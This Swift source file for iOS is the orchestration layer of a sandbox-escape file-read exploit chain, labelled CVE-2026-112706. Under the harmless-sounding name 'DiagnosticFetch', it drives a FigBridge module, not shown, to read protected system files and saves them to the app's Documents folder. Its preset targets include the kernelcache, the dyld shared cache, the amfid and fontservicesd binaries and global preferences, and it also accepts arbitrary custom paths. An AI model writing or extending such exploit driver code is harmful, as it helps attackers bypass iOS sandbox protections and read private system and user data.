// DiagnosticFetch.swift
// lang: Swift, file: DiagnosticFetch.swift, target: iOS 16+
// CVE-2026-112706 file-read chain — Swift orchestration layer.
//
// Wraps FigBridge to provide a clean async API for the UI tab.
// Predefined target presets match what mediaplaybackd can reach.

import Foundation

// MARK: - Preset targets

struct DiagnosticTarget {
    let label: String
    let path:  String
    let isDir: Bool

    static let presets: [DiagnosticTarget] = [
        .init(label: "SystemVersion.plist",  path: "/System/Library/CoreServices/SystemVersion.plist", isDir: false),
        .init(label: "GlobalPreferences",    path: "/private/var/mobile/Library/Preferences/.GlobalPreferences.plist", isDir: false),
        .init(label: "Fonts/",               path: "/System/Library/Fonts", isDir: true),
        .init(label: "Fonts/Core/",          path: "/System/Library/Fonts/Core", isDir: true),
        .init(label: "kernelcache",          path: "/System/Library/Caches/com.apple.kernelcaches/kernelcache", isDir: false),
        .init(label: "dyld shared cache",    path: "/System/Library/dyld/dyld_shared_cache_arm64e", isDir: false),
        .init(label: "amfid binary",         path: "/usr/libexec/amfid", isDir: false),
        .init(label: "fontservicesd binary", path: "/System/Library/PrivateFrameworks/FontServices.framework/fontservicesd", isDir: false),
        .init(label: "Custom path…",         path: "", isDir: false),
    ]
}

// MARK: - Result type

struct DiagnosticResult {
    let target:   DiagnosticTarget
    let files:    [String: Data]   // relative name → bytes
    let log:      [String]
    let elapsed:  TimeInterval
}

// MARK: - Runner

final class DiagnosticFetch {

    typealias LogBlock = (String) -> Void

    /// Run the exploit chain against `target`. Calls `log` on the calling queue
    /// during progress. Returns a `DiagnosticResult` via `completion` on main.
    static func run(target: DiagnosticTarget,
                    customPath: String? = nil,
                    log: @escaping LogBlock,
                    completion: @escaping (DiagnosticResult) -> Void) {

        DispatchQueue.global(qos: .userInitiated).async {
            var entries = [String]()
            let start   = Date()

            func emit(_ s: String) {
                entries.append(s)
                log(s)
            }

            emit("DiagnosticFetch: Run started")
            emit("DiagnosticFetch: target = \(target.label)")

            let resolvedPath = (target.path.isEmpty ? (customPath ?? "") : target.path)
            guard !resolvedPath.isEmpty else {
                emit("DiagnosticFetch: ERROR — no path")
                DispatchQueue.main.async {
                    completion(.init(target: target, files: [:], log: entries, elapsed: -Date().timeIntervalSince(start)))
                }
                return
            }

            emit("DiagnosticFetch: Opening target path: \(resolvedPath)")
            var results = [String: Data]()

            if target.isDir {
                var err: NSError?
                let dict = FigBridge.readDirectory(atPath: resolvedPath,
                                                   maxFiles: 64,
                                                   error: &err)
                if let d = dict {
                    results = d
                    emit("DiagnosticFetch: read \(d.count) files from directory")
                    for (name, data) in d.sorted(by: { $0.key < $1.key }) {
                        emit("  \(name): \(data.count) bytes")
                    }
                } else {
                    emit("DiagnosticFetch: ERROR — \(err?.localizedDescription ?? "unknown")")
                }
            } else {
                let url = URL(fileURLWithPath: resolvedPath)
                var err: NSError?
                let data = FigBridge.readFile(at: url, error: &err)
                if let d = data {
                    let name = (resolvedPath as NSString).lastPathComponent
                    results[name] = d
                    emit("DiagnosticFetch: read \(name): \(d.count) bytes")
                } else {
                    emit("DiagnosticFetch: ERROR — \(err?.localizedDescription ?? "unknown")")
                }
            }

            // Save everything to Documents/DiagnosticRun/
            let docsURL = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
            let outDir  = docsURL.appendingPathComponent("DiagnosticRun", isDirectory: true)
            try? FileManager.default.createDirectory(at: outDir, withIntermediateDirectories: true)

            for (name, data) in results {
                let dest = outDir.appendingPathComponent(name)
                do {
                    try data.write(to: dest)
                    emit("DiagnosticFetch: saved → DiagnosticRun/\(name)")
                } catch {
                    emit("DiagnosticFetch: Save failed for \(name): \(error.localizedDescription)")
                }
            }

            let elapsed = Date().timeIntervalSince(start)
            emit(String(format: "DiagnosticFetch: Run finished (%.2fs)", elapsed))

            DispatchQueue.main.async {
                completion(.init(target: target, files: results, log: entries, elapsed: elapsed))
            }
        }
    }
}
